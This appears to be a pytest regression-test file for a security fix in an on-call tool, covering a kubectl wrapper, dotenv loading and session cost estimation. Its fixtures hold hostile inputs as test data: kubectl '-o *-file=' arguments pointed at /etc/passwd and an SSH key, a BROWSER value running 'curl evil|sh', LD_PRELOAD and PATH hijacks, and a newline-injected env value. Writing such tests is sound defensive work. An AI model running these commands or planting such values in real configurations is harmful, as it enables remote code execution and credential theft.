"""Regression tests for the review's must-fix security and cost findings."""

from __future__ import annotations

import os
from pathlib import Path
from unittest.mock import patch

import pytest

from aegis.config.env import is_loadable_env_key, load_dotenv, write_env_key
from aegis.config.schema import ToolsConfig, ToolsKubectlConfig
from aegis.tools.oncall.kubectl_tools import handle_kubectl
from aegis.util.metrics import estimate_cost_usd
from aegis.voice.protocol import UsageSnapshot


def _kubectl_tools(**kwargs) -> ToolsConfig:
    defaults = {"enabled": True, "allowed_verbs": ["get"], "allowed_namespaces": ["staging"]}
    defaults.update(kwargs)
    return ToolsConfig(kubectl=ToolsKubectlConfig(**defaults))


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "extra_args",
    [
        ["-o", "go-template-file=/etc/passwd"],
        ["-o=go-template-file=/etc/passwd"],
        ["-o", "jsonpath-file=/etc/passwd"],
        ["-o", "custom-columns-file=/etc/passwd"],
        ["-o", "templatefile=/etc/passwd"],
        ["--output", "go-template-file=/home/u/.ssh/id_ed25519"],
    ],
)
async def test_kubectl_rejects_file_reading_output_formats(extra_args: list[str]) -> None:
    """`-o *-file=` renders an arbitrary local file to stdout — never allowed.

    These are read-class verbs, so nothing else in the pipeline would prompt.
    """
    with patch("aegis.tools.oncall.kubectl_tools.shutil.which", return_value="/usr/bin/kubectl"):
        r = await handle_kubectl(
            {"verb": "get", "resource": "pods", "namespace": "staging", "extra_args": extra_args},
            tools=_kubectl_tools(),
        )
    assert r.is_error
    assert r.decision == "deny"
    assert "extra_arg_not_allowed" in r.output


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "extra_args",
    [
        ["-o", "json"],
        ["-o", "yaml"],
        ["-o", "wide"],
        ["-o", "name"],
        ["-o", "jsonpath={.items[0].metadata.name}"],
        ["-o", "custom-columns=NAME:.metadata.name"],
        ["-o", "go-template={{.metadata.name}}"],
        ["--sort-by", ".metadata.name"],
    ],
)
async def test_kubectl_allows_presentation_output_formats(extra_args: list[str]) -> None:
    class Proc:
        returncode = 0

        async def communicate(self):
            return b"ok\n", b""

    async def fake_exec(*args, **kwargs):
        return Proc()

    with (
        patch("aegis.tools.oncall.kubectl_tools.shutil.which", return_value="/usr/bin/kubectl"),
        patch("asyncio.create_subprocess_exec", side_effect=fake_exec),
    ):
        r = await handle_kubectl(
            {"verb": "get", "resource": "pods", "namespace": "staging", "extra_args": extra_args},
            tools=_kubectl_tools(),
        )
    assert not r.is_error, r.output


@pytest.mark.asyncio
async def test_kubectl_empty_context_allowlist_fails_closed() -> None:
    """An empty allowlist must not mean 'any cluster' — namespace limits rely on it."""
    with patch("aegis.tools.oncall.kubectl_tools.shutil.which", return_value="/usr/bin/kubectl"):
        r = await handle_kubectl(
            {
                "verb": "get",
                "resource": "pods",
                "namespace": "staging",
                "context": "prod-us-east",
            },
            tools=_kubectl_tools(context_allowlist=[]),
        )
    assert r.is_error
    assert r.decision == "deny"
    assert "context_not_allowed" in r.output


@pytest.mark.asyncio
async def test_kubectl_omitted_context_allowed_when_allowlist_empty() -> None:
    """Falling back to the kubeconfig current-context stays fine."""

    class Proc:
        returncode = 0

        async def communicate(self):
            return b"ok\n", b""

    captured: list[tuple] = []

    async def fake_exec(*args, **kwargs):
        captured.append(args)
        return Proc()

    with (
        patch("aegis.tools.oncall.kubectl_tools.shutil.which", return_value="/usr/bin/kubectl"),
        patch("asyncio.create_subprocess_exec", side_effect=fake_exec),
    ):
        r = await handle_kubectl(
            {"verb": "get", "resource": "pods", "namespace": "staging"},
            tools=_kubectl_tools(context_allowlist=[]),
        )
    assert not r.is_error
    assert "--context" not in captured[0]


def test_dotenv_ignores_process_control_keys(tmp_path: Path, monkeypatch) -> None:
    """A dotenv must not be able to redirect config or hijack webbrowser.open."""
    env_file = tmp_path / "secrets.env"
    env_file.write_text(
        "OPENAI_API_KEY=sk-real\n"
        "XDG_CONFIG_HOME=/tmp/evil\n"
        "BROWSER=/bin/sh -c 'curl evil|sh' %s\n"
        "LD_PRELOAD=/tmp/evil.so\n"
        "PATH=/tmp/evil/bin\n",
        encoding="utf-8",
    )
    for key in ("OPENAI_API_KEY", "XDG_CONFIG_HOME", "BROWSER", "LD_PRELOAD"):
        monkeypatch.delenv(key, raising=False)
    original_path = os.environ.get("PATH")

    monkeypatch.setattr("aegis.config.env.env_file_candidates", lambda: [env_file])
    load_dotenv()

    assert os.environ["OPENAI_API_KEY"] == "sk-real"
    assert "XDG_CONFIG_HOME" not in os.environ
    assert "BROWSER" not in os.environ
    assert "LD_PRELOAD" not in os.environ
    assert os.environ.get("PATH") == original_path


def test_cwd_dotenv_is_not_a_candidate(tmp_path: Path, monkeypatch) -> None:
    """Running aegis inside an untrusted directory must not read its .env."""
    hostile = tmp_path / "untrusted"
    hostile.mkdir()
    (hostile / ".env").write_text("OPENAI_API_KEY=sk-attacker\n", encoding="utf-8")
    # Make it look like a checkout too — CWD is still not trusted.
    (hostile / "pyproject.toml").write_text("[project]\nname='x'\n", encoding="utf-8")
    (hostile / "src" / "aegis").mkdir(parents=True)
    monkeypatch.chdir(hostile)

    from aegis.config.env import env_file_candidates

    assert (hostile / ".env") not in env_file_candidates()


def test_is_loadable_env_key_allows_credentials_only() -> None:
    assert is_loadable_env_key("OPENAI_API_KEY")
    assert is_loadable_env_key("SOMEVENDOR_API_KEY")
    assert is_loadable_env_key("AWS_PROFILE")
    assert not is_loadable_env_key("XDG_CONFIG_HOME")
    assert not is_loadable_env_key("BROWSER")
    assert not is_loadable_env_key("PYTHONPATH")


def test_write_env_key_rejects_newline_injection(tmp_path: Path) -> None:
    """A pasted 'key' with an embedded newline must not add extra env lines."""
    target = tmp_path / "secrets.env"
    with pytest.raises(ValueError):
        write_env_key(target, "OPENAI_API_KEY", "sk-real\nBROWSER=/bin/sh -c evil %s")
    assert not target.exists() or "BROWSER" not in target.read_text(encoding="utf-8")


def test_cached_text_tokens_do_not_zero_out_cost() -> None:
    """Cached text must be re-priced, not discounted at the audio differential.

    The old formula subtracted (input_audio - cached_input) per cached token,
    driving cost to the 0.0 floor and silently disabling max_session_cost_usd.
    """
    usage = UsageSnapshot(
        input_audio_tokens=1_000,
        input_text_tokens=500_000,
        output_text_tokens=1_000,
        cached_input_tokens=480_000,
        cached_input_text_tokens=480_000,
    )
    cost = estimate_cost_usd(usage, "gpt-realtime-2.1")
    # 20k uncached text @4.0 + 480k cached @0.4 + 1k audio @32 + 1k out text @16
    assert cost == pytest.approx(0.08 + 0.192 + 0.032 + 0.016, rel=1e-6)
    assert cost > 0.0


def test_cost_is_monotonic_as_cached_usage_accumulates() -> None:
    """Adding usage must never reduce the running estimate."""
    running = UsageSnapshot()
    previous = 0.0
    for _ in range(10):
        running = running.merge(
            UsageSnapshot(
                input_audio_tokens=200,
                input_text_tokens=20_000,
                output_audio_tokens=300,
                cached_input_tokens=18_000,
                cached_input_text_tokens=18_000,
            )
        )
        cost = estimate_cost_usd(running, "gpt-realtime-2.1-mini")
        assert cost >= previous
        previous = cost
    assert previous > 0.0


def test_cost_without_cached_breakdown_attributes_to_text() -> None:
    """Servers that report only a cached total must not zero the estimate."""
    usage = UsageSnapshot(
        input_audio_tokens=10_000,
        input_text_tokens=100_000,
        cached_input_tokens=90_000,
    )
    cost = estimate_cost_usd(usage, "gpt-realtime-2.1")
    # cached attributed to text first: 10k text uncached @4.0, 90k cached @0.4,
    # all 10k audio still charged at the audio rate.
    assert cost == pytest.approx(0.04 + 0.036 + 0.32, rel=1e-6)
